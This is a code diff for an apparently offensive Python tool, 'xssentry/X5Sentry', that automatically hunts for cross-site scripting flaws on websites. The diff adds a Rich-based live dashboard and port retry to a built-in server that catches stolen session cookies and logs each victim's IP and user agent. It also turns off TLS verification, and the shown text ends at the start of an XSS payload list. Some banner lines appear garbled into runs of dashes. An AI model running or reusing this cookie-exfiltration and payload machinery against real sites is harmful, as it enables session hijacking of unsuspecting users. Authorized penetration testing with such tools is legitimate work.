@@ -1,37 +1,38 @@
 #!/usr/bin/env python3
 """
-██╗  ██╗███████╗███████╗███████╗███╗   ██╗████████╗██████╗ ██╗   ██╗
-╚██╗██╔╝██╔════╝██╔════╝██╔════╝████╗  ██║╚══██╔══╝██╔══██╗╚██╗ ██╔╝
- ╚███╔╝ ███████╗███████╗█████╗  ██╔██╗ ██║   ██║   ██████╔╝ ╚████╔╝ 
- ██╔██╗ ╚════██║╚════██║██╔══╝  ██║╚██╗██║   ██║   ██╔══██╗  ╚██╔╝  
-██╔╝ ██╗███████║███████║███████╗██║ ╚████║   ██║   ██║  ██║   ██║   
-╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝╚═╝  ╚═══╝   ╚═╝   ╚═╝  ╚═╝   ╚═╝   
+---------  ---------------------------------------------------------------------------------------------   --------------------------------------------------------- ---------   ---------
+---------------------------------------------------------------------------------------------------------------  ------------------------------------------------------------------------ ------------
+ ------------------ ------------------------------------------------------------------  ------------------ ---------   ---------   ------------------------ --------------------- 
+ ------------------ ------------------------------------------------------------------  ------------------------------   ---------   ------------------------  ---------------  
+------------ ------------------------------------------------------------------------------------------ ------------------   ---------   ---------  ---------   ---------   
+---------  ------------------------------------------------------------------------------------------  ---------------   ---------   ---------  ---------   ---------   
 
-  xssentry v4.0 — Autonomous XSS Hunter  [HELLHOUND-class]
-  Detected XSS types: Reflected · Stored · DOM · Mutation(mXSS) · uXSS · Blind
-  Engines: Reflected · Stored · DOM-based · Mutation(mXSS) · uXSS · Blind XSS
+  xssentry v4.0 --- Autonomous XSS Hunter  [HELLHOUND-class]
+  Detected XSS types: Reflected -- Stored -- DOM -- Mutation(mXSS) -- uXSS -- Blind
+  Engines: Reflected -- Stored -- DOM-based -- Mutation(mXSS) -- uXSS -- Blind XSS
   Pipeline:
-    1. Threaded crawl (HTML + JS/SPA)    → endpoint + param discovery
-    2. Parallel param discovery          → error-probe + wordlist fuzz
-    3. Risk scoring                      → high-risk params first
-    4. Reflected XSS                     → inject → verify in same response
-    5. Stored XSS                        → inject → visit retrieval URLs → check
-    6. DOM XSS                           → JS sink analysis + headless probe
-    7. Mutation XSS (mXSS)              → innerHTML mutation bypass payloads
-    8. Universal XSS (uXSS)             → cross-origin protocol vectors
-    9. Blind XSS                         → OOB callback server + out-of-band confirm
-   10. Cookie exfil                      → auto-fire + catch on confirmed XSS
+    1. Threaded crawl (HTML + JS/SPA)    --- endpoint + param discovery
+    2. Parallel param discovery          --- error-probe + wordlist fuzz
+    3. Risk scoring                      --- high-risk params first
+    4. Reflected XSS                     --- inject --- verify in same response
+    5. Stored XSS                        --- inject --- visit retrieval URLs --- check
+    6. DOM XSS                           --- JS sink analysis + headless probe
+    7. Mutation XSS (mXSS)              --- innerHTML mutation bypass payloads
+    8. Universal XSS (uXSS)             --- cross-origin protocol vectors
+    9. Blind XSS                         --- OOB callback server + out-of-band confirm
+   10. Cookie exfil                      --- auto-fire + catch on confirmed XSS
 
   v3.2 upgrades (HELLHOUND integration):
-    · HELLHOUND label system  (ok/warn/err/info/found/phase/section)
-    · ThreadPoolExecutor crawler  (parallel page + JS processing)
-    · Enhanced JSExtractor  (REST/router/template/WebSocket patterns)
-    · Progress bars during crawl and testing
-    · Thread-safe tprint with _print_lock
-    · Clean status output — crawling noise suppressed, summaries shown
+    -- HELLHOUND label system  (ok/warn/err/info/found/phase/section)
+    -- ThreadPoolExecutor crawler  (parallel page + JS processing)
+    -- Enhanced JSExtractor  (REST/router/template/WebSocket patterns)
+    -- Progress bars during crawl and testing
+    -- Thread-safe tprint with _print_lock
+    -- Clean status output --- crawling noise suppressed, summaries shown
 """
 
 import argparse
+import subprocess
 import http.server
 import json
 import os
@@ -56,121 +57,230 @@ try:
 except ImportError:
     PLAYWRIGHT_INSTALLED = False
 
+from rich.console import Console, Group
+from rich.panel import Panel
+from rich.text import Text
+from rich.align import Align
+from rich.table import Table
+from rich.progress import Progress, BarColumn, TextColumn, TimeRemainingColumn, SpinnerColumn, MofNCompleteColumn
+from rich.rule import Rule
+from rich import box
+from rich.live import Live
+from rich.status import Status
+from rich.layout import Layout
 
-# ─────────────────────────────────────────────────────────────────────────────
-# ANSI COLOR SYSTEM  — HELLHOUND-style with xssentry gradient palette
-# ─────────────────────────────────────────────────────────────────────────────
+console = Console(log_path=False, log_time=False)
+
+
+# ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+# ANSI COLOR SYSTEM  --- HELLHOUND-style with xssentry gradient palette
+# ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 class C:
     RESET   = "\033[0m"
     BOLD    = "\033[1m"
     DIM     = "\033[2m"
-    ITAL    = "\033[3m"
-    # Standard
-    RED     = "\033[31m";  GREEN   = "\033[32m"
-    YELLOW  = "\033[33m";  BLUE    = "\033[34m"
-    MAGENTA = "\033[35m";  CYAN    = "\033[36m"
+    # Brighter 256-color palette
+    NEON_G  = "\033[38;5;82m"   # Neon Green
+    NEON_B  = "\033[38;5;45m"   # Electric Blue
+    NEON_O  = "\033[38;5;208m"  # Bright Orange
+    NEON_P  = "\033[38;5;199m"  # Hot Pink
+    NEON_Y  = "\033[38;5;226m"  # Laser Yellow
+    CYAN    = "\033[36m"
     WHITE   = "\033[37m"
-    # Bright
-    BRED    = "\033[91m";  BGREEN  = "\033[92m"
-    BYELLOW = "\033[93m";  BBLUE   = "\033[94m"
-    BMAGENTA= "\033[95m";  BCYAN   = "\033[96m"
+    BRED    = "\033[91m"
+    BYELLOW = "\033[93m"
     BWHITE  = "\033[97m"
-    # Backgrounds
-    BGRED   = "\033[41m";  BGGREEN = "\033[42m"
-    BGBLUE  = "\033[44m";  BGMAGENTA="\033[45m"
-    # 256-color helpers
     @staticmethod
     def fg(n): return f"\033[38;5;{n}m"
     @staticmethod
     def bg(n): return f"\033[48;5;{n}m"
 
 
-# ── Core color/label primitives  (HELLHOUND-style) ───────────────────────────
-def color(text, *styles):
-    return "".join(styles) + str(text) + C.RESET
+# ------ Core color/label primitives  (HELLHOUND-style) ---------------------------------------------------------------------------------
+def color(text, style):
+    return f"[{style}]{text}[/{style}]"
 
-def label(tag, text, tc=C.BCYAN):
-    return (f"{color('[', C.DIM)}{color(tag, tc, C.BOLD)}"
-            f"{color(']', C.DIM)} {text}")
+# ------ Modern Label Primitives (Rich-based) ---------------------------------------------------------------------------------
+def label(tag, text, style="cyan"):
+    return f"[{style}][{tag}][/{style}] {text}"
 
-# ── XSS-adapted label functions ──────────────────────────────────────────────
-def ok(t):       return label("+",       t, C.BGREEN)
-def warn(t):     return label("!",       t, C.BYELLOW)
-def err(t):      return label("-",       t, C.BRED)
-def info(t):     return label("*",       t, C.BCYAN)
-def found(t):    return label("FOUND",   t, C.BCYAN)
-def js_ep(t):    return label("JS",      t, C.BMAGENTA)
-def phase(t):    return label("PHASE",   t, C.BMAGENTA)
-def xss_lbl(t):  return label("XSS",    t, C.BRED)
-def ck_lbl(t):   return label("COOKIE", t, C.fg(214))
-def skp(t):      return label("SKIP",   t, C.DIM)
-def hit_lbl(t):  return label("HIT",    t, C.BYELLOW)
-def prb_lbl(t):  return label("FUZZ",   t, C.fg(75))
-def fp_lbl(t):   return label("FP",     t, C.DIM)
+def ok(t):       return f"[bold green][+][/bold green] {t}"
+def warn(t):     return f"[bold orange3][!][/bold orange3] {t}"
+def err(t):      return f"[bold red][-][/bold red] {t}"
+def info(t):     return f"[bold cyan][*][/bold cyan] {t}"
+def found(t):    return f"[bold green]FOUND[/bold green] {t}"
+def js_ep(t):    return f"[bold magenta]JS[/bold magenta] {t}"
+def phase(t):    return f"[bold magenta]PHASE[/bold magenta] {t}"
+def xss_lbl(t):  return f"[bold red]XSS[/bold red] {t}"
+def ck_lbl(t):   return f"[bold orange3]COOKIE[/bold orange3] {t}"
+def skp(t):      return f"[dim]SKIP[/dim] {t}"
+def hit_lbl(t):  return f"[bold yellow]HIT[/bold yellow] {t}"
+def prb_lbl(t):  return f"[bold cyan]FUZZ[/bold cyan] {t}"
+def fp_lbl(t):   return f"[dim]FP[/dim] {t}"
 
-# ── Thread-safe print ────────────────────────────────────────────────────────
-_print_lock = threading.Lock()
-
+# ------ Thread-safe print ------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 def tprint(*a, **kw):
-    with _print_lock:
-        print(*a, **kw)
+    console.print(*a, **kw)
 
 def _strip_ansi(s):
     return re.sub(r'\x1b\[[0-9;]*m', '', str(s))
 
 
-# ── Section / progress  (HELLHOUND-style, XSS colors) ───────────────────────
-def section(title, icon=""):
-    bar = color("─" * 72, C.DIM + C.CYAN)
-    mid = (icon + " ") if icon else ""
-    tprint(f"\n{bar}")
-    tprint(f"  {color(mid + title, C.BOLD + C.BCYAN)}")
-    tprint(f"{bar}")
+# ------ Section / progress  (Rich-style) ---------------------------------------------------------------------
+def section(title):
+    console.print()
+    console.rule(f"[bold cyan]{title.upper()}[/bold cyan]", style="cyan")
+    console.print()
 
 def progress(cur, tot, w=30):
-    pct   = cur / tot if tot else 0
-    fill  = int(pct * w)
-    bar   = color("█" * fill, C.BCYAN) + color("░" * (w - fill), C.DIM)
-    pstr  = color(f"{int(pct*100):3d}%", C.BWHITE)
-    cstr  = color(f"{cur}/{tot}", C.DIM)
-    return f"[{bar}] {pstr} {cstr}"
+    # This is a fallback for legacy code. New code should use Rich Progress context.
+    pct = cur / tot if tot else 0
+    return f"{int(pct*100)}%"
 
-def divider(char="─", w=70, col=None):
-    col = col or C.fg(240)
-    return color(char * w, col)
+def divider(char="-", w=60, col=None):
+    return Rule(style="dim")
 
 
-# ─────────────────────────────────────────────────────────────────────────────
+# ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+# HUD STATE & LIVE INTERFACE
+# ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+class HUDState:
+    """Manages global state for the live tactical dashboard."""
+    def __init__(self, target):
+        self._lock = threading.Lock()
+        self.target = target
+        self.start_time = datetime.now()
+        self.endpoints_total = 0
+        self.endpoints_tested = 0
+        self.params_total = 0
+        self.requests_sent = 0
+        self.findings_count = 0
+        self.current_action = "Initializing..."
+        self.last_finding = None
+        self.recent_logs = []
+        self.findings_list = []
+
+    def update(self, **kwargs):
+        with self._lock:
+            for k, v in kwargs.items():
+                if hasattr(self, k):
+                    setattr(self, k, v)
+                elif k == "log":
+                    self.recent_logs.append(v)
+                    if len(self.recent_logs) > 8: self.recent_logs.pop(0)
+
+    def add_finding(self, finding):
+        with self._lock:
+            self.findings_list.append(finding)
+            self.findings_count += 1
+            self.last_finding = finding
+
+class CyberTacticalHUD:
+    """Constructs the Rich Layout for the live dashboard."""
+    def __init__(self, state):
+        self.state = state
+
+    def make_layout(self):
+        layout = Layout()
+        layout.split_column(
+            Layout(name="main"),
+            Layout(name="footer", size=3)
+        )
+        layout["main"].split_row(
+            Layout(name="left", ratio=1),
+            Layout(name="right", ratio=3)
+        )
+        return layout
+
+    def get_renderable(self):
+        layout = self.make_layout()
+
+        # Left: Stats panel
+        eps_total = self.state.endpoints_total or 1
+        eps_done  = self.state.endpoints_tested
+        pct       = int((eps_done / eps_total) * 100)
+        bar_fill  = int((eps_done / eps_total) * 18)
+        bar       = "█" * bar_fill + "░" * (18 - bar_fill)
+
+        stats_table = Table(show_header=False, box=None, padding=(0, 1))
+        stats_table.add_row("[bold yellow]Target[/]",   f"[dim]{self.state.target[:35]}[/]")
+        stats_table.add_row("[bold yellow]Status[/]",   f"[bold cyan]{self.state.current_action}[/]")
+        stats_table.add_row("[bold yellow]Progress[/]", f"[cyan]{bar}[/] [bold]{pct}%[/]")
+        stats_table.add_row("[bold yellow]Endpoints[/]",f"{eps_done} / {eps_total}")
+        stats_table.add_row("[bold yellow]Requests[/]", f"{self.state.requests_sent}")
+        stats_table.add_row("[bold red]VULN HITS[/]",   f"[bold red]{self.state.findings_count}[/]")
+        layout["left"].update(Panel(stats_table, title="[bold white]X5SENTRY[/]", border_style="yellow"))
+
+        # Right: Live findings feed
+        f_table = Table(
+            title="[bold red]● LIVE FINDINGS[/]",
+            box=box.SIMPLE_HEAVY, expand=True, show_lines=False
+        )
+        f_table.add_column("Sev",   width=5,  justify="center")
+        f_table.add_column("Type",  style="bold magenta", width=12)
+        f_table.add_column("Param", style="orange3", width=14)
+        f_table.add_column("Score", width=7,  justify="right")
+        f_table.add_column("Endpoint", style="white")
+
+        if self.state.findings_list:
+            for f in self.state.findings_list[-12:]:
+                score = f.get("score", 0)
+                sev   = "[bold red]CRIT[/]" if score >= 90 else "[bold red]HIGH[/]" if score >= 70 else "[bold yellow]MED[/]"
+                f_table.add_row(
+                    sev,
+                    f.get("xss_type", "reflected").upper()[:11],
+                    f.get("param", "N/A")[:13],
+                    f"[bold]{score}%[/]",
+                    f.get("url", "N/A")[:55],
+                )
+        else:
+            f_table.add_row("[dim]--[/]", "[dim]Scanning...[/]", "[dim]--[/]", "[dim]--[/]", "[dim]Awaiting results[/]")
+        layout["right"].update(Panel(f_table, border_style="red"))
+
+        # Footer: progress bar
+        prog     = eps_done / eps_total
+        bar_w    = 70
+        filled   = int(prog * bar_w)
+        prog_bar = "█" * filled + "░" * (bar_w - filled)
+        layout["footer"].update(Panel(
+            Align.center(Text(f"{prog_bar}  {pct}%", style="bold cyan")),
+            border_style="dim", title="[dim]AUDIT PROGRESS[/dim]"
+        ))
+
+        return layout
+
+
+# ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 # BANNER
-# ─────────────────────────────────────────────────────────────────────────────
+# ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 
 def print_banner():
-    art = [
-        r" ██╗  ██╗███████╗███████╗███████╗███╗   ██╗████████╗██████╗ ██╗   ██╗",
-        r" ╚██╗██╔╝██╔════╝██╔════╝██╔════╝████╗  ██║╚══██╔══╝██╔══██╗╚██╗ ██╔╝",
-        r"  ╚███╔╝ ███████╗███████╗█████╗  ██╔██╗ ██║   ██║   ██████╔╝ ╚████╔╝ ",
-        r"  ██╔██╗ ╚════██║╚════██║██╔══╝  ██║╚██╗██║   ██║   ██╔══██╗  ╚██╔╝  ",
-        r" ██╔╝ ██╗███████║███████║███████╗██║ ╚████║   ██║   ██║  ██║   ██║   ",
-        r" ╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝╚═╝  ╚═══╝   ╚═╝   ╚═╝  ╚═╝   ╚═╝   "
-    ]
-    print()
-    for line in art:
-        print(color(line, C.BRED, C.BOLD))
-    meta = [
-        ("Tool",    "X5Sentry \u2014 Autonomous XSS Hunter"),
-        ("Version", "3.2  [HELLHOUND-engine \xb7 ThreadPool \xb7 Enhanced-JS \xb7 Fast-Parallel]"),
-        ("Engine",  "Crawl(HTML+JS/SPA) \u2192 ParamDiscover \u2192 XSS \u2192 Verify \u2192 Cookie-Exfil"),
-        ("Safety",  "4-stage FP elimination \xb7 non-destructive probes \xb7 authorized use only"),
-    ]
-    for k, v in meta:
-        print(f"  {color(k+':', C.BYELLOW, C.BOLD):<28} {color(v, C.BWHITE)}")
-    print()
-    print(color("  \u26a0  For authorized security testing only. Use responsibly.", C.BYELLOW))
-    print(color("  " + "\u2500" * 68, C.DIM))
-    print()
-# ─────────────────────────────────────────────────────────────────────────────
+    art = r"""
+  __  __  ____ ____  _____ _   _ _____ ____  __   __
+  \ \/ / / ___/ ___|| ____| \ | |_   _|  _ \ \ \ / /
+   \  /  \___ \___ \|  _| |  \| | | | | |_) | \ V / 
+   /  \   ___) |__) | |___| |\  | | | |  _ <   | |  
+  /_/\_\ |____/____/|_____|_| \_| |_| |_| \_\  |_|  
+    """
+    
+    # Minimalist sleek header
+    title_text = Text.from_ansi(art)
+    title_text.stylize("bold red")
+    
+    console.print(Rule(style="bold red", title="[bold white]\u26a1 XSS AUDIT SYSTEM[/]"))
+    console.print(Align.center(title_text))
+    
+    meta_table = Table(box=None, show_header=False, padding=(0, 2))
+    meta_table.add_row(Text("Tool", style="bold yellow"), "X5Sentry \u2014 Professional XSS Detection Engine")
+    meta_table.add_row(Text("Engine", style="bold yellow"), "Input \u2192 Audit \u2192 Verify \u2192 Exfil")
+    meta_table.add_row(Text("Safety", style="bold yellow"), "4-stage FP elimination \xb7 Authorized Testing")
+    
+    console.print(Align.center(meta_table))
+    console.print(Rule(style="bold yellow", title="[bold red]\u26a0 Authorized Testing Only[/]"))
+    console.print()
+# ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 # COOKIE CATCH SERVER
-# ─────────────────────────────────────────────────────────────────────────────
+# ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 class CookieCatcher:
     caught = []
     _lock  = threading.Lock()
@@ -197,12 +307,11 @@ class CookieCatcher:
                 cookie = qs.get("c", qs.get("cookie", [""]))[0]
                 ua     = self.headers.get("User-Agent", "")
                 src_ip = self.client_address[0]
-                ts     = datetime.now().strftime("%H:%M:%S")
                 if cookie:
-                    entry = {"ts": ts, "ip": src_ip, "cookie": cookie, "ua": ua}
+                    entry = {"ip": src_ip, "cookie": cookie, "ua": ua}
                     with CookieCatcher._lock:
                         CookieCatcher.caught.append(entry)
-                    tprint(f"\n  {ck_lbl('COOKIE RECEIVED!')} {color(ts, C.DIM)}")
+                    tprint(f"\n  {ck_lbl('COOKIE RECEIVED!')}")
                     tprint(f"  {color('  From IP :', C.BYELLOW)} {color(src_ip, C.BWHITE)}")
                     tprint(f"  {color('  Cookie  :', C.BYELLOW)} {color(cookie, C.fg(214), C.BOLD)}")
                     tprint(f"  {color('  UA      :', C.DIM)} {color(ua[:80], C.DIM)}\n")
@@ -211,15 +320,24 @@ class CookieCatcher:
                 self.end_headers()
                 self.wfile.write(b"ok")
             def log_message(self, *a): pass
-        try:
-            self.server  = http.server.HTTPServer((self.host, self.port), _Handler)
-            self.url     = f"http://{self._local_ip()}:{self.port}"
-            self._thread = threading.Thread(target=self.server.serve_forever, daemon=True)
-            self._thread.start()
-            return self.url
-        except OSError as e:
-            tprint(f"  {warn(f'Cookie server failed on :{self.port} → {e}')}")
-            return None
+
+        # Try up to 5 ports if the default is busy
+        ports_to_try = [self.port] if self.port != 0 else []
+        ports_to_try.extend([random.randint(8000, 9000) for _ in range(5)])
+        
+        for port in ports_to_try:
+            try:
+                self.server  = http.server.HTTPServer((self.host, port), _Handler)
+                self.port    = port
+                self.url     = f"http://{self._local_ip()}:{self.port}"
+                self._thread = threading.Thread(target=self.server.serve_forever, daemon=True)
+                self._thread.start()
+                return self.url
+            except OSError:
+                continue
+        
+        tprint(f"  {warn(f'Cookie server failed to start (tried ports {ports_to_try})')}")
+        return None
 
     def stop(self):
         if self.server: self.server.shutdown()
@@ -227,9 +345,9 @@ class CookieCatcher:
     def summary(self): return list(CookieCatcher.caught)
 
 
-# ─────────────────────────────────────────────────────────────────────────────
+# ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 # SSL + HTTP CLIENT
-# ─────────────────────────────────────────────────────────────────────────────
+# ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 _SSL = ssl.create_default_context()
 _SSL.check_hostname = False
 _SSL.verify_mode    = ssl.CERT_NONE
@@ -283,229 +401,9 @@ class HTTPClient:
                     "elapsed": el, "url": url, "headers": {}, "error": str(ex)}
 
 
-# ─────────────────────────────────────────────────────────────────────────────
-# JS / SPA ENDPOINT EXTRACTOR  — HELLHOUND patterns adapted for XSS
-# ─────────────────────────────────────────────────────────────────────────────
-class JSExtractor:
-    """
-    HELLHOUND JSExtractor adapted for XSS parameter discovery.
-
-    Patterns (ported from HELLHOUND v5.7):
-      _REST     — axios/fetch/$ajax/http.get/XMLHttpRequest/API path literals
-      _TEMPLATE — backtick template literals containing paths
-      _ROUTER   — Express/Vue/React router definitions
-      _QS       — query string parameter names
-      _BODY     — JSON.stringify({...}) key extraction
-      _WS       — WebSocket endpoint discovery (XSS via ws: URLs)
-
-    XSS-specific additions:
-      _REFLECT  — reflected parameter hints in JS (response.param, data.field)
-      _SINK     — dangerous JS sinks near URL params (document.write, innerHTML)
-    """
-    # ── HELLHOUND REST patterns ───────────────────────────────────────────────
-    _REST = [
-        re.compile(r'axios\.(get|post|put|delete|patch)\s*\(\s*["\`]([^"\`\n]{3,80})["\`]', re.I),
-        re.compile(r'fetch\s*\(\s*["\`]([^"\`\n]{3,80})["\`]', re.I),
-        re.compile(r'\$\.(get|post|ajax)\s*\(\s*["\`]([^"\`\n]{3,80})["\`]', re.I),
-        re.compile(r'(?:this\.|self\.)?(?:http|api)\.(get|post|put|delete|patch)\s*\(\s*["\`]([^"\`\n]{3,80})["\`]', re.I),
-        re.compile(r'XMLHttpRequest[^;]{0,200}\.open\s*\(\s*["\']([A-Z]+)["\']\s*,\s*["\']([^"\']{3,80})["\']', re.I),
-        re.compile(r'["\`](/(?:api|v\d+|rest|graphql|admin|auth|user|account|search|upload|ws)[a-zA-Z0-9_\-\./]*)["\`]', re.I),
-    ]
-    # ── HELLHOUND template literal pattern ────────────────────────────────────
-    _TEMPLATE = re.compile(r'`(/[^`\n]{3,80})`')
-    # ── HELLHOUND router pattern ──────────────────────────────────────────────
-    _ROUTER   = re.compile(r'(?:router|app|Route)\s*\.\s*(get|post|put|delete|patch|use)\s*\(\s*["\']([^"\']{2,60})["\']', re.I)
-    # ── HELLHOUND query-string + body patterns ────────────────────────────────
-    _QS       = re.compile(r'[?&]([a-zA-Z_][a-zA-Z0-9_]{1,30})=', re.I)
-    _BODY     = re.compile(r'JSON\.stringify\s*\(\s*\{([^}]{3,300})\}', re.DOTALL)
-    _KEY_OBJ  = re.compile(r'["\']?([a-zA-Z_][a-zA-Z0-9_]{1,30})["\']?\s*:', re.I)
-    # ── HELLHOUND WebSocket discovery ────────────────────────────────────────
-    _WS       = re.compile(r'new\s+WebSocket\s*\(\s*["\`]([^"\`\n]{3,80})["\`]', re.I)
-
-    # ── XSS-specific: reflected param hints and dangerous sinks ───────────────
-    _REFLECT  = re.compile(
-        r'(?:response|res|data|result|json)\s*\.\s*([a-zA-Z_][a-zA-Z0-9_]{1,30})', re.I)
-    _SINK     = re.compile(
-        r'(?:document\.write|innerHTML|outerHTML|insertAdjacentHTML|eval|'
-        r'location\.href|location\.replace|location\.assign)\s*[=(]'
-        r'[^;]{0,120}([a-zA-Z_][a-zA-Z0-9_]{1,30})', re.I)
-
-    # ── Noise filter ──────────────────────────────────────────────────────────
-    _NOISE = re.compile(
-        r'\.(css|js|png|jpg|jpeg|gif|svg|ico|woff|woff2|ttf|eot|map|min\.js)$'
-        r'|^/static/|^/assets/|^/images/|^/fonts/|^/dist/', re.I)
-    _JS_KW = {
-        'function','return','var','let','const','if','else','for','while',
-        'switch','case','break','continue','typeof','instanceof','import',
-        'export','class','extends','new','this','super','null','undefined',
-        'true','false','try','catch','finally','throw','async','await'
-    }
-
-    def _valid_path(self, p):
-        if not p or not isinstance(p, str): return False
-        p = p.split("?")[0].split("#")[0]
-        if not p.startswith("/"): return False
-        if len(p) < 2 or len(p) > 120: return False
-        if self._NOISE.search(p): return False
-        return bool([s for s in p.split("/") if s])
-
-    def _norm(self, p):
-        p = p.split("#")[0].split("?")[0]
-        p = re.sub(r'/\d+', '/{id}', p)
-        p = re.sub(r'/[0-9a-f]{8,}', '/{id}', p, flags=re.I)
-        p = re.sub(r'\$\{[^}]+\}', '{var}', p)
-        p = re.sub(r'//+', '/', p)
-        return p.rstrip("/") or "/"
-
-    def extract(self, js_content, base_url=""):
-        """
-        Extract REST endpoints, router definitions, template paths, and
-        infer XSS-relevant parameters from JS source.
-
-        Returns list of endpoint dicts:
-          {path, method, params, source, base_url, ws_endpoints}
-        """
-        results = {}
-        ws_endpoints = []
-
-        def add(path, method, params, source):
-            if not self._valid_path(path): return
-            norm = self._norm(path)
-            if norm in results:
-                ex = results[norm]
-                if ex["method"] == "GET" and method != "GET":
-                    ex["method"] = method
-                ex["params"] = sorted(set(ex["params"] + params))
-            else:
-                results[norm] = {
-                    "path":     norm,
-                    "method":   method.upper(),
-                    "params":   params,
-                    "source":   source,
-                    "base_url": base_url,
-                }
-
-        # ── REST calls ────────────────────────────────────────────────────────
-        for pat in self._REST:
-            for m in pat.finditer(js_content):
-                groups = m.groups()
-                if len(groups) == 1:
-                    path, method = groups[0], "GET"
-                else:
-                    a, b = groups[0], groups[1]
-                    if a.upper() in ("GET","POST","PUT","DELETE","PATCH"):
-                        method, path = a.upper(), b
-                    elif b.upper() in ("GET","POST","PUT","DELETE","PATCH"):
-                        method, path = b.upper(), a
-                    else:
-                        path, method = a, "GET"
-                qs_params = self._QS.findall(path)
-                add(path.split("?")[0], method, qs_params, "js_rest")
-
-        # ── Router definitions ────────────────────────────────────────────────
-        for m in self._ROUTER.finditer(js_content):
-            method, path = m.group(1), m.group(2)
-            if method.lower() == "use": method = "GET"
-            add(path, method, [], "js_router")
-
-        # ── Template literals ─────────────────────────────────────────────────
-        for m in self._TEMPLATE.finditer(js_content):
-            path = m.group(1)
-            if any(kw in path for kw in ["api","v1","v2","rest","graphql","admin","auth","search"]):
-                add(path.split("?")[0], "GET", [], "js_template")
-
-        # ── Body params from JSON.stringify ───────────────────────────────────
-        body_params = set()
-        for m in self._BODY.finditer(js_content):
-            for k in self._KEY_OBJ.findall(m.group(1)):
-                if k.lower() not in self._JS_KW and len(k) > 1:
-                    body_params.add(k)
-        for ep in results.values():
-            if ep["method"] in ("POST", "PUT", "PATCH") and body_params:
-                ep["params"] = sorted(set(ep["params"]) | body_params)
-
-        # ── WebSocket endpoints ───────────────────────────────────────────────
-        ws_endpoints = [m.group(1) for m in self._WS.finditer(js_content)]
-
-        # ── XSS: reflected response fields as parameter hints ─────────────────
-        reflect_hints = set()
-        for m in self._REFLECT.finditer(js_content):
-            k = m.group(1)
-            if k.lower() not in self._JS_KW and 2 < len(k) < 30:
-                reflect_hints.add(k)
-
-        # ── XSS: dangerous sinks — param names near sinks get high priority ───
-        sink_params = set()
-        for m in self._SINK.finditer(js_content):
-            k = m.group(1)
-            if k.lower() not in self._JS_KW and 2 < len(k) < 30:
-                sink_params.add(k)
-
-        # Attach reflect/sink hints to any GET endpoint (XSS usually GET-reflected)
-        if reflect_hints or sink_params:
-            for ep in results.values():
-                if ep["method"] == "GET":
-                    ep["params"] = sorted(
-                        set(ep["params"]) | reflect_hints | sink_params)
-                    if sink_params:
-                        ep["source"] += "+sink"
-
-        result_list = list(results.values())
-        for ep in result_list:
-            ep["ws_endpoints"] = ws_endpoints
-        return result_list
-
-
-# ─────────────────────────────────────────────────────────────────────────────
-# HTML PARSER
-# ─────────────────────────────────────────────────────────────────────────────
-class PageParser(HTMLParser):
-    def __init__(self, base):
-        super().__init__()
-        self.base = base
-        self._bp  = urllib.parse.urlparse(base)
-        self.links    = set()
-        self.js_links = set()
-        self.forms    = []
-        self._form    = None
-
-    def handle_starttag(self, tag, attrs):
-        a = dict(attrs)
-        if tag == "a":
-            h = (a.get("href") or "").strip()
-            if h and not h.startswith(("javascript:", "mailto:", "#", "tel:", "data:")):
-                full = urllib.parse.urljoin(self.base, h)
-                if urllib.parse.urlparse(full).netloc == self._bp.netloc:
-                    self.links.add(full)
-        elif tag == "script":
-            s = (a.get("src") or "").strip()
-            if s:
-                full = urllib.parse.urljoin(self.base, s)
-                if urllib.parse.urlparse(full).netloc == self._bp.netloc:
-                    self.js_links.add(full)
-        elif tag == "form":
-            self._form = {
-                "action": urllib.parse.urljoin(self.base, a.get("action", self.base)),
-                "method": a.get("method", "GET").upper(),
-                "inputs": []
-            }
-        elif tag in ("input", "textarea", "select") and self._form is not None:
-            n = a.get("name") or a.get("id")
-            t = a.get("type", "text").lower()
-            if n and t not in ("submit", "button", "reset", "image", "file"):
-                self._form["inputs"].append(
-                    {"name": n, "type": t, "value": a.get("value", "test")})
-
-    def handle_endtag(self, tag):
-        if tag == "form" and self._form:
-            if any(i["type"] != "hidden" for i in self._form["inputs"]):
-                self.forms.append(self._form)
-            self._form = None
-
-
-# ─────────────────────────────────────────────────────────────────────────────
+# ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 # COMMON PARAMETER WORDLIST
-# ─────────────────────────────────────────────────────────────────────────────
+# ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 COMMON_PARAMS = [
     "q","s","search","query","term","keyword","keywords","find","text","input",
     "name","title","subject","content","body","message","description","comment",
@@ -525,17 +423,17 @@ COMMON_PARAMS = [
 ]
 
 
-# ─────────────────────────────────────────────────────────────────────────────
+# ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 # XSS PAYLOAD LIBRARY
-# ─────────────────────────────────────────────────────────────────────────────
+# ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 PAYLOADS = [
-    # ─────────────────────────────────────────────────────────────────────
-    # TIER 1 — raw HTML injection (no context escape needed)
+    # ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+    # TIER 1 --- raw HTML injection (no context escape needed)
     # Used first: fast signal whether any XSS is possible at all.
-    # ─────────────────────────────────────────────────────────────────────
+    # ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
     {"id":"t1_script",        "pl":'<script>alert(1)</script>',                    "tier":1,"type":"html"},
     {"id":"t1_script_sl",     "pl":'<script>alert(1)//',                           "tier":1,"type":"html"},
-    {"id":"t1_script_cm",     "pl":'<script>alert(1)<!–',                          "tier":1,"type":"html"},
+    {"id":"t1_script_cm",     "pl":'<script>alert(1)<!---',                          "tier":1,"type":"html"},
